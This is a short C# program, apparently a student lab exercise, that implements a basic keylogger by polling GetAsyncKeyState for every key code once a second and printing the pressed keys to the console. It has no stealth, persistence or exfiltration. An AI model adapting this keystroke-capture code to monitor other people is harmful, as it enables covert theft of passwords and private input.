using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Laba4KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        static void Main(string[] agrs)
        {
            StartLogging();
        }

        static void StartLogging()
        {
            while (true)
            {
                Thread.Sleep(1000);
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32367)
                        Console.WriteLine((Keys)i);

                }
            }
        }
    }
}
